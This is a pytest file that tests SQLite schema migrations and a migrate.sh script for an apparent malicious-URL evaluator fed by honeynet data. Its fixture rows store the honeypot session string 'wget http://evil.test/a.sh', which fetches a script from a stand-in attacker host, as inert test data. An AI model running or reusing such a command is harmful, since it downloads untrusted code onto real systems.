"""
install/migrations/*.sql on top of the schema of the deployed version
(tests/data/schema/create_db_main.sql = install/create_db.sql of branch main)
must give the same schema as a fresh install/create_db.sql, without losing
the existing rows. install/migrate.sh applies them once and only once.
"""

import glob
import os
import re
import shutil
import subprocess

import pysqlite3 as sqlite3
import pytest

from tests.conftest import CREATE_DB_SQL, DATA_DIR, REPO_ROOT

pytestmark = pytest.mark.integration

MAIN_SCHEMA = os.path.join(DATA_DIR, "schema", "create_db_main.sql")
MIGRATIONS = sorted(glob.glob(os.path.join(REPO_ROOT, "install", "migrations", "*.sql")))
CHECK_IN = re.compile(r"\bCHECK\s*\(\s*(\w+)\s+IN\s*\(([^()]*)\)\s*\)", re.IGNORECASE)


def read(path):
    with open(path, encoding="utf-8") as f:
        return f.read()


def check_constraints(conn, table):
    """{column: allowed values} of the table's CHECK (column IN (...)) constraints.

    SQLite has no PRAGMA for CHECKs, so they are parsed from the stored CREATE TABLE text
    (formatting, comments, ADD COLUMN and RENAME make that text differ between a fresh and a migrated DB)."""
    sql = re.sub(r"--[^\n]*", "", conn.execute(
        "SELECT sql FROM sqlite_master WHERE type = 'table' AND name = ?", (table,)).fetchone()[0])
    checks = {col: {v.strip() for v in values.split(",")} for col, values in CHECK_IN.findall(sql)}
    assert len(checks) == len(re.findall(r"\bCHECK\b", sql, re.IGNORECASE)), \
        f"{table}: CHECK which is not 'column IN (...)' - extend check_constraints()"
    return checks


def schema(conn):
    """Tables with their columns, indexes, triggers and foreign keys (schema_migrations excluded)."""
    tables = [r[0] for r in conn.execute(
        "SELECT name FROM sqlite_master WHERE type = 'table' "
        "AND name NOT LIKE 'sqlite_%' AND name != 'schema_migrations'")]
    return {
        "columns": {t: [(r[1], r[2].upper(), r[3], r[4], r[5])
                        for r in conn.execute(f"PRAGMA table_xinfo({t})")] for t in tables},
        "foreign_keys": {t: sorted(r[2:] for r in conn.execute(f"PRAGMA foreign_key_list({t})")) for t in tables},
        "indexes": {r[0] for r in conn.execute(
            "SELECT name FROM sqlite_master WHERE type = 'index' AND name NOT LIKE 'sqlite_%'")},
        # (unique, columns, partial) of every index incl. UNIQUE constraints, whose auto-index names differ
        "indexed_columns": {t: sorted((r[2], tuple(c[2] for c in conn.execute(f"PRAGMA index_info('{r[1]}')")), r[4])
                                      for r in conn.execute(f"PRAGMA index_list({t})")) for t in tables},
        "checks": {t: check_constraints(conn, t) for t in tables},
        "triggers": {r[0] for r in conn.execute("SELECT name FROM sqlite_master WHERE type = 'trigger'")},
    }


def migrate(conn):
    for migration in MIGRATIONS:
        conn.executescript(read(migration))
    return conn


def main_db_with_data():
    """In-memory DB with the deployed (main) schema and a few rows of every table."""
    conn = sqlite3.connect(":memory:")
    conn.executescript(read(MAIN_SCHEMA))
    conn.executescript("""
        INSERT INTO urls (url, first_seen, last_seen, classification, classification_reason, last_edit)
            VALUES ('http://evil.test/a.sh', '2025-01-01', '2025-02-01', 'malicious', 'Blacklist check', NULL),
                   ('http://evil.test/x86', '2025-01-02', '2025-02-02', 'harmless', 'manual', 'alice');
        INSERT INTO sessions (session_hash, session, idea_id) VALUES ('h1', 'wget http://evil.test/a.sh', 'idea-1');
        INSERT INTO url_session (url, session) VALUES ('http://evil.test/a.sh', 'h1');
        INSERT INTO url_source (url, source) VALUES ('http://evil.test/a.sh', 'CESNET Hugo'),
                                                    ('http://evil.test/x86', 'URL content');
        INSERT INTO discovered_urls (url, src_url) VALUES ('http://evil.test/x86', 'http://evil.test/a.sh');
    """)
    return conn


def test_migration_files_are_numbered_in_order():
    numbers = [os.path.basename(m).split("_", 1)[0] for m in MIGRATIONS]
    assert all(len(n) == 3 and n.isdigit() for n in numbers), numbers  # name order == apply order
    assert numbers == [f"{i:03d}" for i in range(1, len(numbers) + 1)]  # no gaps, no duplicates


def test_migrations_give_the_fresh_schema():
    migrated = sqlite3.connect(":memory:")
    migrated.executescript(read(MAIN_SCHEMA))
    migrate(migrated)
    fresh = sqlite3.connect(":memory:")
    fresh.executescript(read(CREATE_DB_SQL))

    assert schema(migrated) == schema(fresh)


def test_migrated_db_enforces_the_check_constraints():
    conn = migrate(main_db_with_data())
    checked = {(t, col) for t in ("urls", "download_observations", "sandbox_submissions", "urlhaus_submissions")
               for col in check_constraints(conn, t)}
    assert checked == {("urls", c) for c in ("classification", "reported", "evaluated", "status",
                                              "status_changed", "eval_later")} | {
        ("download_observations", "change_type"), ("sandbox_submissions", "status"), ("urlhaus_submissions", "status")}

    conn.execute("INSERT INTO download_observations (url, fetched_at, change_type) "
                 "VALUES ('http://evil.test/a.sh', '2025-03-01', 'content_changed')")
    with pytest.raises(sqlite3.IntegrityError, match="CHECK"):  # 005 rebuilt the table, the CHECK must survive
        conn.execute("INSERT INTO download_observations (url, fetched_at, change_type) "
                     "VALUES ('http://evil.test/a.sh', '2025-03-01', 'bogus')")
    with pytest.raises(sqlite3.IntegrityError, match="CHECK"):
        conn.execute("UPDATE urls SET classification = 'bogus' WHERE url = 'http://evil.test/a.sh'")


def test_migrations_keep_existing_rows_and_backfill_history():
    conn = migrate(main_db_with_data())

    assert conn.execute("SELECT url, classification FROM urls ORDER BY url").fetchall() == [
        ("http://evil.test/a.sh", "malicious"), ("http://evil.test/x86", "harmless")]
    assert conn.execute("SELECT url, session FROM url_session").fetchall() == [("http://evil.test/a.sh", "h1")]
    assert conn.execute("SELECT url, src_url FROM discovered_urls").fetchall() == [
        ("http://evil.test/x86", "http://evil.test/a.sh")]
    # 001: every known source becomes an observation, honeynet nodes are recognised,
    #      every url_session pair becomes an observation with its session;
    # 014: the source-only row of a.sh duplicates its session row and is dropped
    assert set(conn.execute("SELECT url, source, honeynet, session, observed_at FROM observations")) == {
        ("http://evil.test/a.sh", "CESNET Hugo", "CESNET Hugo", "h1", "2025-01-01"),
        ("http://evil.test/x86", "URL content", None, None, "2025-01-02")}
    # 002: the current classification is the first history entry (analyst or 'system')
    assert conn.execute("SELECT url, classification, actor FROM classification_history ORDER BY url").fetchall() == [
        ("http://evil.test/a.sh", "malicious", "system"), ("http://evil.test/x86", "harmless", "alice")]
    assert conn.execute("PRAGMA foreign_key_check").fetchall() == []


def test_migrations_drop_orphan_rows_of_the_deployed_db():
    """main had no FK enforcement, so rows pointing to deleted URLs / sessions may exist (005 removes them)."""
    conn = main_db_with_data()
    conn.executescript("""
        INSERT INTO url_source (url, source) VALUES ('http://gone.test/', 'CESNET Hugo');
        INSERT INTO url_session (url, session) VALUES ('http://gone.test/', 'h1'),
                                                      ('http://evil.test/x86', 'gone-session');
        INSERT INTO discovered_urls (url, src_url) VALUES ('http://evil.test/a.sh', 'http://gone.test/');
    """)

    migrate(conn)

    assert conn.execute("PRAGMA foreign_key_check").fetchall() == []
    assert conn.execute("SELECT url, session FROM url_session").fetchall() == [("http://evil.test/a.sh", "h1")]
    assert conn.execute("SELECT url, src_url FROM discovered_urls").fetchall() == [
        ("http://evil.test/x86", "http://evil.test/a.sh")]
    for table in ("url_source", "observations", "classification_history"):
        assert conn.execute(f"SELECT COUNT(*) FROM {table} WHERE url = 'http://gone.test/'").fetchone()[0] == 0, table
    assert conn.execute("SELECT COUNT(*) FROM observations WHERE session = 'gone-session'").fetchone()[0] == 0


def test_migrated_db_cascades_url_delete():
    conn = migrate(main_db_with_data())
    conn.execute("PRAGMA foreign_keys = ON")
    conn.executescript("""
        INSERT INTO content (id, sha256, file_path, first_seen) VALUES (1, 'aa', 'aa.bin', '2025-03-01');
        INSERT INTO download_observations (url, content_id, fetched_at) VALUES ('http://evil.test/a.sh', 1, '2025-03-01');
        INSERT INTO user_url_history (user, url, visited_at) VALUES ('alice', 'http://evil.test/a.sh', '2025-03-01');
        INSERT INTO urlhaus_submissions (url, content_id, submitted_at, status)
            VALUES ('http://evil.test/a.sh', 1, '2025-03-01', 'ok');
    """)

    conn.execute("DELETE FROM urls WHERE url = 'http://evil.test/a.sh'")

    for table in ("url_session", "url_source", "discovered_urls", "observations", "classification_history",
                  "download_observations", "user_url_history", "urlhaus_submissions"):
        assert conn.execute(f"SELECT COUNT(*) FROM {table} WHERE url = 'http://evil.test/a.sh'").fetchone()[0] == 0, table
    assert conn.execute("SELECT COUNT(*) FROM discovered_urls").fetchone()[0] == 0  # src_url cascades too
    assert conn.execute("SELECT COUNT(*) FROM content").fetchone()[0] == 1  # content may be shared, never cascaded
    assert conn.execute("SELECT COUNT(*) FROM urls").fetchone()[0] == 1


@pytest.fixture
def migrate_sh(tmp_path):
    """Run a copy of install/migrate.sh (with its own migrations dir) against a DB with the main schema;
    returns (run, db_path, migrations_dir)."""
    if shutil.which("sqlite3") is None:
        pytest.skip("sqlite3 command line tool not installed")
    install = tmp_path / "install"
    shutil.copytree(os.path.join(REPO_ROOT, "install", "migrations"), install / "migrations")
    for script in ("migrate.sh", "common.sh"):
        shutil.copy(os.path.join(REPO_ROOT, "install", script), install / script)
    db_path = tmp_path / "db" / "evaluator.sqlite"
    db_path.parent.mkdir()
    main_db_with_data().backup(target := sqlite3.connect(str(db_path)))
    target.close()
    config = tmp_path / "config.yaml"
    config.write_text(f'db_path: "{db_path}"\n', encoding="utf-8")

    def run():
        return subprocess.run(["sh", str(install / "migrate.sh")], cwd=REPO_ROOT,
                              env={**os.environ, "CONFIG": str(config), "TERM": "dumb"},
                              capture_output=True, text=True, timeout=60)

    return run, db_path, install / "migrations"


def applied_migrations(db_path):
    with sqlite3.connect(str(db_path)) as conn:
        return [r[0] for r in conn.execute("SELECT name FROM schema_migrations ORDER BY name")]


def test_migrate_sh_applies_each_migration_once_and_keeps_a_backup(migrate_sh):
    run, db_path, _ = migrate_sh

    first = run()
    assert first.returncode == 0, first.stdout + first.stderr
    backup = db_path.parent / "backup" / "db_backup.sqlite"
    assert backup.exists()
    with sqlite3.connect(str(backup)) as old:  # the backup is the DB before the migration
        assert "content" not in {r[0] for r in old.execute("SELECT name FROM sqlite_master")}
    backup_mtime = backup.stat().st_mtime

    second = run()  # nothing pending -> no change, no new backup
    assert second.returncode == 0, second.stdout + second.stderr
    assert backup.stat().st_mtime == backup_mtime

    assert applied_migrations(db_path) == [os.path.basename(m) for m in MIGRATIONS]
    with sqlite3.connect(str(db_path)) as conn:
        fresh = sqlite3.connect(":memory:")
        fresh.executescript(read(CREATE_DB_SQL))
        assert schema(conn) == schema(fresh)
        assert conn.execute("SELECT COUNT(*) FROM urls").fetchone()[0] == 2


def test_migrate_sh_applies_only_a_new_migration_and_refreshes_the_backup(migrate_sh):
    run, db_path, migrations_dir = migrate_sh
    assert run().returncode == 0
    (migrations_dir / "999_new.sql").write_text("CREATE TABLE new_feature (id INTEGER);\n", encoding="utf-8")

    result = run()  # 001..014 already applied -> re-running them would fail (ALTER TABLE ADD COLUMN)

    assert result.returncode == 0, result.stdout + result.stderr
    assert "Applied 999_new.sql" in result.stdout
    assert [line for line in result.stdout.splitlines() if line.startswith("Applying ")] == ["Applying 999_new.sql ..."]
    assert applied_migrations(db_path)[-1] == "999_new.sql"
    backup = db_path.parent / "backup" / "db_backup.sqlite"
    with sqlite3.connect(str(backup)) as old:  # the new backup is the DB after the first run
        assert "content" in {r[0] for r in old.execute("SELECT name FROM sqlite_master")}
        assert "new_feature" not in {r[0] for r in old.execute("SELECT name FROM sqlite_master")}


def test_migrate_sh_dry_run_blocks_a_failing_migration(migrate_sh):
    run, db_path, migrations_dir = migrate_sh
    (migrations_dir / "998_broken.sql").write_text("SELECT * FROM no_such_table;\n", encoding="utf-8")
    (migrations_dir / "999_after.sql").write_text("CREATE TABLE after_broken (id INTEGER);\n", encoding="utf-8")

    result = run()

    assert result.returncode != 0
    assert "Dry run failed: 998_broken.sql failed" in result.stdout
    assert applied_migrations(db_path) == []  # not even the valid 001..014 touched the active DB
    with sqlite3.connect(str(db_path)) as conn:
        assert "content" not in {r[0] for r in conn.execute("SELECT name FROM sqlite_master")}
    assert not (db_path.parent / "backup" / "db_dryrun.sqlite").exists()

    (migrations_dir / "998_broken.sql").write_text("SELECT 1;\n", encoding="utf-8")  # fixed -> rerun applies all
    assert run().returncode == 0
    assert applied_migrations(db_path)[-2:] == ["998_broken.sql", "999_after.sql"]


def test_migrate_sh_dry_run_blocks_new_foreign_key_violations(migrate_sh):
    run, db_path, migrations_dir = migrate_sh
    (migrations_dir / "999_orphan.sql").write_text(
        "INSERT INTO url_source (url, source) VALUES ('http://gone.test/', 'CESNET Hugo');\n", encoding="utf-8")

    result = run()

    assert result.returncode != 0
    assert "foreign key violations increased from 0 to 1" in result.stdout
    assert applied_migrations(db_path) == []


def test_migrate_sh_dry_run_tolerates_violations_from_before_the_migration(migrate_sh):
    run, db_path, _ = migrate_sh
    assert run().returncode == 0
    with sqlite3.connect(str(db_path)) as conn:  # orphan written with FK enforcement off
        conn.execute("INSERT INTO url_source (url, source) VALUES ('http://gone.test/', 'CESNET Hugo')")
    (db_path.parent.parent / "install" / "migrations" / "999_new.sql").write_text(
        "CREATE TABLE new_feature (id INTEGER);\n", encoding="utf-8")

    result = run()

    assert result.returncode == 0, result.stdout + result.stderr
    assert "Dry run passed (foreign key violations: 1)" in result.stdout
    assert applied_migrations(db_path)[-1] == "999_new.sql"


def test_migrate_sh_fails_without_a_database(migrate_sh):
    run, db_path, _ = migrate_sh
    db_path.unlink()

    result = run()

    assert result.returncode != 0
    assert "Database not found" in result.stdout
    assert not db_path.exists()  # no empty DB created by mistake


def test_014_keeps_observations_recorded_by_the_collectors():
    conn = migrate(main_db_with_data())
    conn.executescript("""
        INSERT INTO sessions (session_hash, session) VALUES ('h2', 'wget http://evil.test/a.sh');
        -- a later sighting: a session row and a session-less feed row of another day
        INSERT INTO observations (url, source, honeynet, session, observed_at)
            VALUES ('http://evil.test/a.sh', 'Warden', 'CESNET Hugo', 'h2', '2025-03-01T10:00:00Z'),
                   ('http://evil.test/a.sh', 'HoneyNet.Asia', NULL, NULL, '2025-03-01');
    """)
    before = conn.execute("SELECT COUNT(*) FROM observations").fetchone()[0]

    # running it again changes nothing
    conn.executescript(read(os.path.join(REPO_ROOT, "install", "migrations", "014_observations_backfill_duplicates.sql")))

    assert conn.execute("SELECT COUNT(*) FROM observations").fetchone()[0] == before == 4
